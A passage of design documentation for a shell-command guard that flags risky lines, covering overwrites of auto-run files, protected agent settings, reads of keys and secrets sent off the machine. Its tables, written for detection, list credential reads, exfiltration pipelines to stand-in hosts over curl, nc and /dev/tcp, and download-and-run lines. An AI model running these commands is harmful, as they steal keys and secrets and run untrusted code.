`install`, `rsync`, `sed -i`, `perl -i`, `dd`, `curl -o`, `Set-Content`,
`Out-File`, `Copy-Item`, `copy`, `xcopy`, ...) finds it without a rule of its
own.

| Line | Verdict |
| --- | --- |
| `echo x > .envrc`, `tee .vscode/tasks.json`, `cp a .github/workflows/ci.yml`, `sed -i s/a/b/ .husky/pre-commit`, `Set-Content .envrc x`, `copy a .gitlab-ci.yml`, `echo x > VSCODE~1\TASKS~1.JSO` | `overwrite` |
| `cd .github/workflows && cp a ci.yml`, `echo x > .ENVRC`, `echo x > $'.\x65nvrc'`, `echo x > src/deep/.envrc` | `overwrite`: a `cd`, case, quotes and depth are read |
| `cp lefthook.yml sub/`, `cp -t .vscode a/tasks.json`, `mv a/.envrc sub/` | `overwrite`: the file lands at its own name in a folder that is one for certain (a trailing separator, `.`, `..`, `-t`, several sources) |
| `cp -r a .github`, `cp -a a .vscode`, `rsync -a a/ .github/`, `xcopy /s a .github`, `Copy-Item -Recurse a .vscode` | `overwrite`: a recursive copy can replace anything below a folder that holds one |
| `sed -i s/a/b/ .github/workflows/*.yml`, `sed -i s/a/b/ .vscode/*.json`, `sed -i s/a/b/ */Jenkinsfile`, `sed -i s/a/b/ *.yml` | `overwrite`: a pattern that can pick one |
| `cat .envrc`, `grep x .github/workflows/*`, `cp .envrc /tmp/x`, `rm .envrc`, `rm -rf .husky`, `mv .envrc /tmp/x`, `chmod +x .husky/pre-commit` | safe: a read, a delete or a move away of one is not a write that plants code |
| `echo x > Makefile`, `sed -i s/a/b/ package.json`, `echo x > justfile`, `echo x > .vscode/extensions.json` | safe: they only run when someone asks |
| `ren a .envrc`, `rename a .envrc`, `Rename-Item a .envrc`, `Rename-Item -Path a -NewName .envrc`, `rni .vscode\old.json tasks.json`, `mklink .envrc a`, `mklink /h .envrc a`, `New-Item -ItemType SymbolicLink -Path .envrc -Value a`, `New-Item -Path .vscode -Name tasks.json`, `rename old .envrc old`, `rename 's/^tmp$/.envrc/' tmp`, `ln a .envrc` | `overwrite`: a rename or a link puts a file at the new name, which for a rename is in the source's folder |
| `mkdir -p .github/workflows`, `mkdir .husky`, `md .devcontainer`, `New-Item -ItemType Directory .vscode` | safe: an empty folder is no code, and what is written into it is judged then |
| `cp .envrc .envrc.bak`, `cp -r .vscode backup`, `cp *.yml deploy/`, `sed -i s/a/b/ src/*` | safe: a destination that may be a file is not read as a folder, a source pattern is not read as a name, and a pattern of nothing but wildcards names none |
| `echo x > /home/me/other/.envrc`, `echo x > .git/.envrc`, `echo x > /tmp/x/.envrc` | each keeps its own place: beyond the workspace, the history, a temporary file |

A rename or a link is a write of its destination, as a `mv` or an `ln` is:
`Rename-Item`, `ren`, `rni`, cmd's `ren` and `rename`, `mklink` with any switch,
`New-Item -ItemType SymbolicLink`, `HardLink` or `Junction` (`-Type` too), and
`New-Item -Name` in the folder `-Path` names. A rename's new name is a name,
so it lands in the source's folder (`Rename-Item .vscode\old.json tasks.json`
is `.vscode\tasks.json`); what is renamed away is judged as `mv` judges it. The
same holds for a protected name (`ren a .agent`). POSIX `rename` is read only as
util-linux's `rename [-v|-n|-o|-s|-i|-a] FROM TO file...`, whose new names are
plain text (the first `FROM` in a name, every one with `-a`, becomes `TO`) and
land where the file is. An expression is perl's `rename`, which is code: a
line with fewer than three operands, a first operand that is not plain text
(`s/a/b/`, `y/a-z/A-Z/`, `$_ .= ...`), `-e` and any option outside that short
list (`-l`, `-d`, `--nopath`, `--expr=...`) is `unknown`, "runs code the guard
does not read" or "renames with options the guard does not read", and is never
worked out to a new name. The new name of each of its files is unknown, so each
is an `overwrite` of "a file only known when it runs", and what is renamed away
is a `delete` where it is not harmless (`rename 's/agent/b/' .agent` for a
protected `.agent`). `perl-rename`, `prename` and `file-rename` are only ever perl's, so
any line is read so; `rename.ul` is util-linux's. `rename 's/\.htm$/.html/' *.htm`
is an accepted false alarm.

What it does not read: unpacking an archive, `git checkout`, `git apply`,
`git restore`, `git stash pop` and `patch` can write one without naming it;
a recursive copy into the workspace folder itself, or into a folder that is not
named like the first names of a place on the list, can replace one below it;
`mv dir .github` renames a folder onto a name that holds one.

### Protected paths

A caller names what it gates with (its settings, its rules, the folder it keeps
state in) in `Paths::protected` (see [Core](core.md)), and core answers
`Place::Protected` with the caller's words for it, even inside a workspace.
The guard needs no rule of its own: wherever a rule reads a place it takes
anything that is not harmless, so `Protected` is judged as `Sensitive` is, with
the caller's words in the reason. Reading is not a finding; what a read of a
protected file means is not decided here.

With `Protected::folder("/home/me/.agent", "the agent's settings")`:

| Line | Rule | Reason |
| --- | --- | --- |
| `rm ~/.agent/config.yaml`, `rm -rf ~/.agent` | `delete` | deletes the agent's settings |
| `mv ~/.agent/rules /tmp/x` | `delete` | moves the agent's settings |
| `echo x > ~/.agent/config.yaml`, `cp x ~/.agent/rules` | `overwrite` | writes to the agent's settings |
| `sed -i s/a/b/ ~/.agent/rules` | `overwrite` | edits the agent's settings |
| `chmod 777 ~/.agent/rules` | `permissions` | changes permissions of the agent's settings |
| `cat ~/.agent/config.yaml`, `ls ~/.agent` | safe | |

With the same path inside the workspace (`/home/me/work/repo/.agent`), `rm
.agent/rules` from the repository is a `delete`, `rm src/main.rs` stays safe,
and `rm -rf *` is still a delete of the whole workspace. A PowerShell or cmd
line on `C:\Users\me\.agent` is judged the same way, without regard to case
(on every host: `rm -rf .AGENT` is a delete on macOS too), and `AGENT~1` is the
protected name too.

A folder that holds a protected path is protected as well, so the whole folder
cannot be deleted or moved. With `Protected::file("/home/me/work/repo/conf/app/x.yaml", ..)`:

| Line | Verdict |
| --- | --- |
| `rm -rf conf`, `cd conf && rm -rf app`, `mv conf /tmp/x`, `rm -rf c*`, `rm -rf **/x.yaml` | `delete`, in the caller's words |
| `Remove-Item -Recurse conf`, `rd /s /q conf` | `delete`, in the caller's words |
| `touch conf/new.txt`, `rm conf/other.txt`, `rm -rf src`, `cp a.txt conf/`, `cp a.txt conf/app`, `mkdir -p conf/app` | safe: a write into a folder is not a write of it |
| `cp x.yaml conf/app/`, `cp -t conf/app x.yaml`, `mv x.yaml conf/app`, `install x.yaml conf/app/`, `ln -sf other/x.yaml conf/app/`, `cp *.yaml conf/app/`, `Copy-Item x.yaml conf\app`, `Copy-Item y.yaml,x.yaml conf\app`, `copy /y x.yaml conf\app`, `copy y.yaml+x.yaml conf\app` | `overwrite`: the file lands at its own name, which is the protected one |
| `cp -r other/. conf`, `cp -a app conf`, `rsync -a src/ conf/`, `Copy-Item -Recurse src conf`, `robocopy src conf /E`, `xcopy /s /y src conf` | `overwrite`: a recursive copy can replace anything below the folder |
| `rm -rf **/y.yaml`, `rm -rf **/*.rs` | safe: a protected file has nothing below its name (with a protected folder `cfg` they are `delete`) |
| `rm -rf .`, `rm -rf ~` | the workspace, the home directory: a risky place keeps its own words |

How the copy reads its operands: `Copy-Item` and `Move-Item` bind `-Path` at
position 0 and `-Destination` at position 1, and a comma list of sources is
flattened into the arguments, so with no `-Destination` each operand after the
first is read as the destination in turn, the rest as sources, and a risky
reading wins. The value of a parameter, a common one included (`-ErrorAction
Stop`, `-ea 0`, `-OutVariable o`), is never an operand. A source that comes
only from a pipeline (`gci src | cpi -Destination conf\app`), is unknown, or
is what `find -exec`, `-execdir` or `-ok` found (`{}`) lands as a name that
could be anything, which a protected name in the folder can be. The rows are
all kept in `tests/protected.rs`.

A wildcard part stands for one entry, so a `..` after it still climbs:
`src/*/../../../x`. A part that starts with `.` can match `.git`; in PowerShell
and cmd, whose wildcards also match a leading dot, so can a part directly in
the workspace folder that fits the name (`*git`, `?git`, `*\objects`), though
`*\bin` cannot. A pattern whose last part is a catch-all (`*`, `?*`, `*/*`, and
`*.*` on Windows) takes the whole folder. One that picks names (`*.log`,
`*/*.o`) touches files inside it. [Core](core.md) has the rule.

## Reading a key

`read_secret` finds a read of a key or a credential. Refused on the file API,
a key can be read through the shell, so the two guards give the same answer
for the same file: `cat <path>` is `read_secret` exactly when the file guard
calls a read of `<path>` one, in the place's own words (`reads your SSH keys`,
`reads the system's password hashes`). `crates/guards/tests/agree.rs` holds
them to it: it takes every path the file guard's tables name, on a POSIX
machine, a Mac and a Windows one, and runs it through `cat` (POSIX),
`Get-Content` (PowerShell) and `type` (cmd).

What is a secret is core's: a place it marks `Secret` (see
[Core](core.md#what-core-judges)), a disk (its bytes hold every key on it,
`reads a disk, and every key on it`), and in a POSIX shell what the kernel
serves, `/proc/self/environ` and `/dev/mem` (`reads the kernel's process
files`, `reads a device file`). Not the repository's history, not a shell
startup file, not a protected path, and not `.env`, which core does not list.

| Line | Rule | Reason |
| --- | --- | --- |
| `cat ~/.ssh/id_ed25519`, `head -c 100 ~/.aws/credentials`, `base64 < ~/.ssh/id_rsa`, `grep key ~/.netrc` | `read_secret` | reads your SSH keys, reads your AWS credentials, reads your saved logins |
| `Get-Content $HOME\.ssh\id_ed25519`, `type %USERPROFILE%\.aws\credentials` | `read_secret` | reads your SSH keys, reads your AWS credentials |
| `sudo cat ~/.ssh/id_ed25519` | `elevated`, `read_secret` | runs as root, reads your SSH keys |
| `cat /etc/shadow`, `cat /proc/self/environ`, `dd if=/dev/sda` | `read_secret` | the place's words |
| `cat .git/config`, `cat ~/.zshrc`, `cat .env`, `cat src/main.rs`, `ls ~/.ssh` | safe | |

### What reads

A line reads a secret when a program the guard knows opens the file's
contents, or a `<` redirect does (with any program, and in cmd too):

- **The operand table of [Reads only](#the-readers).** One table says which
  arguments each reader opens as files, so `effect` and this rule cannot
  disagree about what a line opens: `cat`, `head`, `tail`, `wc`, `less`,
  `sort`, `diff`, `grep`, `egrep`, `fgrep`, `rg` (every operand but the
  pattern, a `-f FILE` too), `git` (what `--no-index`, `blame --contents` and
  the like name, never the folder `-C` names), `Get-Content`, `Select-String`,
  `type`, `findstr`.
- **Programs that are not reads-only but show or pass on what they open**, with
  what their own options take: `more`, `tac`, `nl`, `rev`, `fold`, `paste`,
  `cut`, `uniq`, `comm`, `cmp`, `od`, `xxd`, `hexdump`, `strings`, `base64`,
  `bat`, `awk` and `sed` (after the program), `tar` (every operand but the
  values of `-C` and the like), `gzip` and the other compressors, `zip`, `7z`,
  `gpg`, `openssl` (`-in`, `-inkey`, `-key`), `curl` given a `file://` URL,
  `source`, `dd if=` (`curl file://$HOME/.ssh/id_rsa` too, `$HOME` in it being
  the home directory as in a plain word), PowerShell's `Import-Clixml`, `Import-Csv` and
  `Compress-Archive`, cmd's `more`, `sort`, `find`, `fc` and `certutil`.
- **A copy reads its sources**, whatever it does with them and wherever they
  land: `cp`, `install`, `rsync`, `Copy-Item`, `copy`, `xcopy`, `robocopy`.
  `cp ~/.ssh/id_ed25519 keys/` is a read of the key, and the key now sits
  where it may be committed.
- **A listing piped into a reader.** The stage before a reader hands it
  names, so a stage that lists a folder of keys is a read of them, through any
  stage that only selects or orders: `ls ~/.ssh | xargs cat`, `find ~/.ssh |
  xargs grep key`, `Get-ChildItem ~\.ssh | Get-Content`, and `find ~/.ssh
  -exec cat {} +`. The words of an `echo` or a `printf` are a list too
  (`echo ~/.ssh/id_rsa | xargs cat`, `printf '%s\n' ~/.ssh/id_rsa | xargs cat`,
  PowerShell's `Write-Output`); a word the guard cannot place is no finding.
- **A `for` over words written out** is read with each word in place, as
  `effect` reads it: `for f in ~/.ssh/*; do cat "$f"; done`, also for a `<`
  redirect in the body.
- The wrappers come off, as for every rule (`sudo cat`, `env cat`, `bash -c
  'cat …'`).

A line that only names a file is not a read of it. `ls ~/.ssh`, `stat`, `du`,
`df`, `file`, `realpath`, `test -f`, `find` with no `-exec` and `echo` give
names, sizes and answers about a file, not what is in it, and are safe. A
program that uses a key and does not show it (`ssh -i ~/.ssh/id_ed25519 host`,
`ssh-add`, `git -C ~/.ssh`) is safe too. A program that sends a file off the
machine (`curl -d @key`, `scp`) is not this rule's. This rule reports what a
line reads and a rule of its own, `SendSecret`, reports what leaves, so one
reads and the other sends, and a line can be both: `cat ~/.ssh/id_ed25519 |
curl -d @- https://x.example` is `read_secret` for the `cat`.

### The spelling of the file

The file is judged by what it resolves to, as for every rule: `~`, `$HOME`,
`${HOME}`, `..`, doubled separators, case (on every host), a Windows short
name, a long path, a device path, a Mac's links to the root, another user's
home, all by [core](core.md). The shell's syntax adds:

- A brace list is spelled out first: `cat ~/.ssh/{id_rsa,x}` and
  `cp ~/.ssh/id_{rsa,ed25519} /tmp` read `~/.ssh/id_rsa`; a list that makes
  more than 256 words is read as a file known only when the line runs.
- A POSIX wildcard part that can match `..` (`.*`, `.?`, `.[.]`, `.[!a]`)
  stands for `.` and `..` as well as the names it picks, since bash 3.2 (macOS's
  `/bin/sh`) and dash match them and the guard cannot know which shell runs
  the line: `cat .*/.*/.ssh/id_rsa` from `~/work/repo` reads `~/.ssh/id_rsa`.
  A folder read all the way down is read so too: from `~/work`, `grep -r x .*`
  reads the home directory and its keys, as `grep -r x ..` does. Core does
  this for every rule that resolves a pattern (`Resolver::places` gives each
  reading), so `rm -rf
  .*/.*/.agent` is judged against the parent as well. `cat .*rc` cannot match
  `..` and is not read that way. PowerShell and cmd wildcards are not.
- A wildcard picks what it can match, as for a protected path:
  `cat ~/.s*/id_rsa`, `cat /etc/sh*dow` and `cat /home/*/.ssh/id_rsa` read a
  key. `cat ~/*` does not, in a POSIX shell, since `*` does not match `.ssh`
  (unless the line turns `dotglob` on); `Get-Content ~\*` does, since a
  PowerShell wildcard matches a leading dot. `cat ~/.*` reads every dot file
  in the home directory, which includes `.netrc`.
- `~alice/.ssh/id_rsa` is read as `/home/alice/.ssh/id_rsa` and
  `/Users/alice/.ssh/id_rsa`, and `~root` also as `/root` and `/var/root`.
- A word that only ends in something known when the line runs lands in the
  folder before it: `cat ~/.ssh/$f` and `cat /proc/$$/environ` are reads
  (`$f` could be `../..`: an accepted false alarm).
- A PowerShell word that is a variable and a path (`$HOME\.ssh\id_rsa`,
  `$env:USERPROFILE/.aws`) is read as the expandable string it is. The grammar
  reads it as a member access and loses the path, so the guard puts it in
  double quotes before it reads the line.
- An ANSI-C string is a value known when the line is read, so it is read:
  `cat $'\x2f'home/me/.ssh/id_rsa` and `cat ~/.ssh/$'id_rsa'` read the key. A
  `~` it makes is a plain character, as it is in a quoted word of the
  shell: `cat $'\x7e'/.ssh/id_rsa` names a folder called `~` and is not a
  finding. `$HOME`, `${HOME}`, `$PWD` and `$TMPDIR` in such a word, or in a brace
  list, are the places they name unless the line sets them.
- PowerShell's `. FILE` and `& FILE`, and a file given as the program
  (`. $HOME/.ssh/id_ed25519`), read what is in the file.
- A `<` redirect has the same spellings. `exec 3< ~/.ssh/id_rsa` and
  `x=$(< ~/.ssh/id_rsa)` read the key. In cmd the target is read as cmd reads
  it, with its quotes off: `more < "%USERPROFILE%\.ssh\id_rsa"` is the key.

### A folder read all the way down

A program that goes through every folder below the one it is given holds the
keys in it when it is given the home directory, a folder holding it, or the
root of a disk: `grep -r BEGIN ~`, `rg token ~` (`rg` skips hidden entries by
default, and is read as if it did not), `cp -r ~ /tmp/b`, `rsync -a ~/ /tmp/b/`,
`tar czf x.tgz ~`, `zip -r x.zip ~`, `diff -r ~ x`, `find ~ -type f -exec cat
{} +`, `find ~ | xargs cat`, cmd's `findstr /s` and `xcopy /s`, PowerShell's
`Copy-Item -Recurse` and `Get-ChildItem -Recurse ~ | Get-Content`. A search
given no place is of the working directory (`cd ~ && rg token`), unless a
pipeline gives it text. The reason says it: `reads your home directory, and the
keys in it`. Another folder that holds a key without being one (`~/.config`,
`/etc`) is not told apart from any other.

### What is not a finding

- **A file known only when the line runs.** `cat $f`, `cat "$(pwd)/x"`, `cat
  "$X/.ssh/id_rsa"`, `cat ~/${NAME}`, `Get-Content
  (Join-Path …)`, a PowerShell string with a variable the guard cannot name, a
  path in a variable the line sets (`k=~/.ssh/id_rsa; cat $k`), and a
  .NET call (`[IO.File]::ReadAllText(…)`). The guard does not guess a value,
  and `classify` flags nothing for it. `effect` already says `Unknown` for each
  (a path known only when it runs is not reads-only), so a caller that only lets
  a line run unasked when it is `ReadsOnly` asks. A reader whose file is known
  and is not a secret is safe, with its own row.
- **A program the guard does not know opens a file.** `jq`, `yq`, `ssh-keygen
  -y -f`, an editor, `column`, an interpreter's own `open()`. The list above is
  what is known; a program outside it is `effect`'s `Unknown`, and a script or
  an interpreter's code is already `unknown`.
- **A program that reads a secret without being given its path**: `gpg
  --export-secret-keys`, `security find-generic-password -w`, `printenv`.
- **What leaves the machine** is `SendSecret`'s, as above: `curl -d @key` and
  `scp key host:` upload a file, and are not read here.

### Accepted false alarms

A false alarm asks once more; a miss lets a key out. Each is a test row:

- A place is a secret by what it is under, not by which file: `cat
  ~/.ssh/id_ed25519.pub`, `cat ~/.ssh/known_hosts`, `cat ~/.ssh/config` and
  `cp ~/.ssh/id_ed25519.pub keys/` are `read_secret`, as they are for the file
  guard. (`cp ~/.ssh/id_ed25519.pub keys/` was a safe row before this rule.)
- A `<` redirect is a read whatever the program makes of it: `wc -l <
  ~/.ssh/known_hosts` is, as `wc -l ~/.ssh/known_hosts` is. `wc` counts, and is
  read like the rest because the redirect cannot tell it apart.
- `~/.ssh/$f` when `$f` climbs out of the folder, `grep -r x ~` when what it
  finds is not a key, `rg x ~` (which skips hidden entries), `git log --
  ~/.ssh/x` (git refuses a path outside the work tree), `tar cf ~/.ssh/x.tar
  src` (the archive is named under `.ssh`), and the pattern of a search that is
  spelled like a key's path.

### Why `effect` still says ReadsOnly

The rule is a finding about the file, not about what the line does to the
machine, so it joins `Elevated` in the findings that leave a line `ReadsOnly`
(see [Reads only](#reads-only)). The other choice, to make a read of a key not
reads-only, would turn `effect` into a second policy about keys, which the
caller already has from `classify`. A caller that runs a line unasked only when
`effect` is `ReadsOnly` must read `classify` too, and it already does to catch
`Elevated`.

## What cannot be read is risky

A line is never safe because the guard gave up on it. These come back risky:

- A program or script known only when it runs: `$CMD`, `eval "$x"`, `trap "$x" EXIT`, `iex $s`,
  `-EncodedCommand`.
- Code handed to an interpreter: `python3 -c`, `node -e`, `bun -e`, `deno eval`, a script piped into
  one.
- A .NET call that deletes, writes or starts a program.
- PowerShell code known only when it runs: a script block that is not written
  out where a cmdlet takes it (`Invoke-Command $b`, `-ScriptBlock $b`, `Start-Job`,
  `Start-ThreadJob`, `Register-ScheduledJob`, `Set-PSBreakpoint -Action`,
  `-Process`/`-Begin`/`-End`/`-RemainingScripts` and the first block of
  `ForEach-Object`, `New-Module`, `Measure-Command`), a hook set on `$ExecutionContext.InvokeCommand` (by
  assignment or its `set_` method, `LocationChangedAction` among them), and code built
  from text (`[scriptblock]::Create(…)`, `NewScriptBlock`, `InvokeScript`,
  `ExpandString`, whose `$( )` subexpressions run). A block
  written out is read where it stands, and so is a string written out as the
  text of the code; a method name quoted (`.'InvokeScript'(…)`) is the same
  method. `ForEach-Object Name` takes a member name, not a block, and what
  follows it is the member's arguments (`$list | % Add $item` is safe), but a
  member name is judged as the call written out is: a method that is
  risky as `.Invoke()` and `.Delete()` are (`% Invoke`, `-MemberName Delete`),
  `InvokeScript`, `NewScriptBlock` and `ExpandString` (their text is read when
  written out, positionally or after `-ArgumentList`), and a hook set by
  `set_` or by its property given an argument. `Start-Job` takes
  `-InitializationScript` by position after the block, so `Start-Job { … } $init` is risky, and a named
  `-InitializationScript` on `Start-ThreadJob` or `Register-ScheduledJob` does not
  make a block given by position safe. A splat (`@p`) on these cmdlets may hold a
  block, so it is risky unless the cmdlet runs one block only and one is written
  out. A comma list stays with the parameter it follows (`-ArgumentList $x, $y`),
  and so does the argument after a parameter written with a colon
  (`-Confirm:$false`), a common parameter (`-ErrorAction Stop`) and `-Args`.
- A path built at run time or by a brace list.
- A line the grammar cannot parse.
- Shells nested past a limit, a parse tree nested too deep, or a line longer
  than the limit.

`unknown` is for a program or a script. `unreadable` is for a line the guard
could not read.

## Reading more than one unit at a time

Some risks only show when units are read together.

- **Links.** A link judges its target too. `ln ~/.zshrc z` is risky, since a
  later write to `z` lands on the startup file.
- **A script a line writes and then runs.** It is risky however it was
  written: a redirect, a download (`curl -o`, `curl -O`, `wget`), a copy or
  `tee`. `curl -fsSLo i.sh URL && sh i.sh` is `run_downloaded`. The guard
  matches the two by the file they name (core's `key`).
  When the line writes a file (a device such as `/dev/null` does not count),
  a script whose path cannot be placed (after a `cd` to somewhere unknown, or
  `bash C:x` after a `cd`) is `unknown`, since it may be the one the line wrote.
  A line that writes nothing has no such script.
- **A listing piped into a delete.** It hands on what it picks. `ls *.bak |
  xargs rm` and `Get-ChildItem *.log | Remove-Item` delete files in the
  workspace. A whole folder listed (`ls | xargs rm -rf`) is as much as the
  folder. A listed pattern is judged as the delete of that pattern is, `..`
  and all: `ls -d src/*/../../.g* | xargs rm -rf` is risky.
- **`find`.** It acts on the folder it searches when its name filter can match
  `.git`, or when it negates or alternates its filters (`!`, `-not`, `-o`).
- **Git config that makes git run a command.** `-c alias.x=!...`,
  `core.pager`, `core.sshCommand`, and `git config` setting them. Reading
  them is fine.
- **In-place edits.** `perl -pi -e` is an edit like `sed -i`, judged by the
  files it edits, when its code is only substitutions (`s/a/b/g`, `tr/.../.../`)
  that run nothing. An `/e` flag, `@{[...]}`, backticks or any other code make
  it risky.

## Secrets that leave the machine

`send_secret` is for a secret sent to another machine. Reading one here is not
this rule: `cat ~/.ssh/config` is [`read_secret`](#reading-a-key). Sending a
file that is not one is safe (`scp build/pkg.tar host:/srv/`,
`curl -d @payload.json https://api.example`).

**What is a secret.**

- A path core marks as holding a key or a credential: `~/.ssh`, `~/.aws`,
  `~/.gnupg`, the keychains and the rest of its table of secrets. Shell
  startup files and the repository's history are sensitive in core too, but
  they hold no secret, so sending one is not this rule. A public key
  (`id_ed25519.pub`) is not one either.
- An `.env` file anywhere, in the workspace too: `.env` and `.env.*`, not a
  folder, and not a template (`.env.example`, `.sample`, `.template`, `.dist`).
  A pattern that can name one (`.env*`, `.e*`, `.*`) counts when the shell
  expands it, as a word of its own: `-T .env*`, `scp .env* host:`. Part of a
  longer word is not expanded: the shell matches the whole word `@.env*`, which
  names no file, and `curl` reads that name as written, so `curl -d @.env*` is
  not a secret sent. This is the shell rule's own check: core's table does not
  hold it, since that would make `rm .env` a `delete` in the workspace.
- The whole environment: `env`, `printenv`, `set`, `export -p`, `declare -x`,
  `/proc/self/environ`, PowerShell's `Get-ChildItem env:` (`gci`, `dir`).
  One variable (`printenv HOME`, `Get-ChildItem env:PATH`) is not. cmd's bare
  `set` is not read by its grammar and comes back `unreadable`.

**What sends.**

- **An upload that names the file**: `curl -d @f` (also `--data`,
  `--data-binary`, `--json`, `--data-urlencode name@f`, `-F name=@f` and
  `name=<f`, `-T f`, `--upload-file`, `-H @f`, in a bundle such as `-sd @f`),
  `wget --post-file f` and `--body-file`, `http`, `https` and `xh` with
  `field@f`, `field=@f` or `@f`, and `Invoke-WebRequest` and
  `Invoke-RestMethod -InFile f`, `Send-MailMessage -Attachments f` (a list),
  and `Start-BitsTransfer -Source f` when `-TransferType` is `Upload`.
- **A copy to another machine**: `scp`, `rsync`, `sftp` and `rclone copy` to
  a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`
  and `gsutil` to a `s3://` or `gs://` one. A source that is a secret goes.
  So does the home directory itself, and a folder that holds it, the root of
  the disk included, which hold them (`scp -r ~ host:`, `scp -r / host:`). A
  destination only known when it runs counts as remote for `scp` and `sftp`,
  and for the others when it holds a colon. The key a program logs in with
  (`ssh -i`, `scp -i`, `-o IdentityFile=`, `curl --key`) is not sent.
- **A pipeline.** A stage reads a secret (any program given one's path, the
  environment, or a file redirected onto it) and a later stage sends its input:
  `nc`, `ncat`, `socat`, `telnet`, `ssh`, `mail`, `Invoke-RestMethod`,
  `Send-MailMessage` (which attaches what it is piped), `curl`
  with `-d @-` or `-T -`, `wget --post-file=-`, `http` and `xh` (unless
  `--ignore-stdin`), `openssl s_client`, `rclone rcat`, `aws s3 cp -`. A stage between them changes nothing: `cat .env | base64 | nc h
  1` is sent. A program an `xargs` or `ForEach-Object` hands its input to
  counts as a stage that reads it. The pipeline after a here-document
  (`cat .env <<EOF | nc host 1`, `cat .env <<EOF | base64 | nc host 1`) is the
  same pipeline as the command before it, however many stages it has; so is a
  here-document after a pipeline (`echo hi | cat .env - <<EOF | nc host 1`),
  whose stages come first. In cmd, `type .env | more | ssh host` is one
  pipeline of three stages, as in the other shells. A pipeline inside a stage
  of another (`(cat .env | base64) | nc host 1`, `cat .env | { base64 | nc host
  1; }`, `cat .env | bash -c "base64 | nc host 1"`, `(type .env | more) | ssh
  host`, `(gc .env | Out-String) | irm …`) runs in that stage: a secret read in
  the inner pipeline counts for that stage of the outer one, and a sender in
  the inner pipeline is handed what the earlier stages of every pipeline around
  it read. A substitution, process substitution or script in a command runs
  with that command's input, so a sender that has one is handed what the
  stages before it read: `cat .env | curl -d "$(cat)" url`, `cat .env | bash -c
  'curl -d "$(cat)" url'`. It does not look at what the substitution runs: `cat
  .env | curl -H "X: $(date)" url` is flagged too, since it pipes a secret into
  a sender.
- **A redirect.** A secret redirected onto the input of one of those
  (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), or a command's output
  redirected to `/dev/tcp/host/port` or `/dev/udp/…`. Only bash's own redirect
  opens that path: `tee /dev/tcp/…` and `dd of=/dev/tcp/…` open a real path,
  find none and send nothing. PowerShell has no `<` redirect.
- **A substitution or a variable.** A sender handed a secret in its own
  arguments: `curl -d "$(cat .env)" url`, `$(<.env)`, a here-document or
  here-string that runs one, `` `…` ``, PowerShell's `-Body (Get-Content f)`;
  and a variable set from one (`k=$(cat .env); curl -d "$k" url`, `export
  K=$(…)`, and a variable set from that, copies included: `j=$k`, `j="$k"`,
  `export j=$k`). A held variable carried by a here-string or an unquoted
  here-document is a sender's input (`nc host 1 <<< "$k"`); a quoted
  delimiter (`<<'EOF'`) expands nothing.

A script a shell starts, a `find -exec` and a substitution take the place in a
pipeline of the command they run for.

Not read, so the caller has to account for them: a secret read into a PowerShell
variable (`$k = Get-Content …`) or by `read` and `mapfile`; a path known only
when it runs (`curl -d @$F`); a connection opened with `exec 3<>/dev/tcp/…`;
`git push` of a committed `.env`; secrets outside core's table (`/etc/shadow`,
a key with an unusual name); and a `find -exec` whose filter picks secrets by a
name the guard does not know (`-name '*.pem'`).

## Reads only

`classify` says whether a line is safe to run without asking. A caller that
asks on every line in a careful mode has a second question: does this line only
read? `ls`, `git status`, `cat src/main.rs` and `rg TODO` change nothing, and a
caller may run them without a question where it asks on `mkdir build`, which is
safe but changes the disk. Safe and reads-only are different answers, so
`effect` answers the second beside `classify`, and it is not a rule: it adds
nothing to `Rule`, and what a caller does with it is its policy.

```rust
effect(line, shell, &paths) -> Effect   // ReadsOnly(Reach), Changes or Unknown
```

| Answer | When |
| --- | --- |
| `ReadsOnly(Reach)` | Every unit is a known reader run with reading flags on files the guard can name, no redirect writes a file (the null device is not one), no `cd` the guard cannot follow, and the rules found nothing but an elevation or a read of a key. The [`Reach`](#reach) says where it reads. |
| `Changes` | Any unit is a known writer, a package manager or a build tool, any redirect writes a file, or a rule found the line risky for what it changes (`delete`, `wipe_disk`, `overwrite`, `git_discard`, `git_remote`, `git_history`, `permissions`, `system_settings`, `stop_system`, `send_secret`). |
| `Unknown` | Anything is not understood: a program the table does not know, a program or script known only when it runs, a nested script, a line that cannot be read in full, a limit hit. Never `ReadsOnly`: what cannot be read is not reads-only. |

A line with a known writer is `Changes` whatever else it holds: `mkdir build &&
./script.sh` changes things, and not knowing the rest does not take that back.
`Unknown` is for a line with nothing known to change and something unread.

`effect` and `classify` come from one code path. A line is split once and
judged once, and both answers are read from that split and its findings, never
from the raw text, so they cannot disagree about what the units are. The
answers are independent, and a caller reads both. **Safe is not reads-only and
reads-only is not Safe**: `cat ~/.ssh/id_ed25519` reads only, beyond the
workspace (and is `read_secret`), and `mkdir build` is safe and changes the
disk. One direction does hold, and `tests/` checks it on every row of every
table and on random noise: a line `classify` finds risky for anything but an
elevation or a read of a key is never `ReadsOnly`. `sudo cat /etc/hosts` is
`ReadsOnly(Beyond)` and `Elevated`, and `cat ~/.ssh/id_ed25519` is
`ReadsOnly(Beyond)` and `ReadSecret`: both findings say what the line is, not
that it changes anything. `effect` puts `ReadSecret` beside `Elevated` because
the line still only reads, and the caller, who reads both answers, decides what
a read of a key means. The `Reach` is `Beyond` for a read of a secret even
inside the workspace.

**Wrappers** come off as `classify` takes them off, and what they run decides:
`sudo cat` reads only. Only the wrappers that just run the next program are
let through (`sudo`, `doas`, `gsudo`, `pkexec`, `env`, `nice`, `ionice`,
`time`, `timeout`, `stdbuf`, `xargs`, `command`, `builtin`, `noglob`,
`nocorrect`, `-`, `coproc`, and the `find` a `-exec` makes), and only with
options the guard knows: any other option makes the line `Unknown`, since it
could do anything (`sudo -e` edits a file, `sudo -s` and `-i` start a shell,
`env -P` changes where programs are found, `env -C` the folder they run in).
`time -o FILE` and `time --output=FILE` write a file, so they are `Changes`.
`flock` makes its lock file, `nohup` may make `nohup.out`, `tmux` and `screen`
start sessions: those wrap a reader into `Unknown`. A shell started with a
script (`bash -c`, `eval`, `cmd /c`, `powershell -Command`) is a program the
table does not know, so it is `Unknown` even when the script it holds only
reads.

### Reach

A caller that runs reads-only lines without asking, in its most careful mode,
needs one more answer: do the reads stay in the project? `ls src` and `cat
src/main.rs` do; `cat /etc/passwd`, `grep -r password ~` and `cat
~/.ssh/id_ed25519` do not. So `ReadsOnly` carries a `Reach`:

```rust
Effect::ReadsOnly(Reach)   // Reach::Workspace or Reach::Beyond
```

`Reach` is exhaustive on purpose, like `Effect`: a third answer would change
what a caller's careful mode means by "stays in the workspace".

`Reach` is about reading what is not the project's. Protected paths are about
writes, and do not count here.

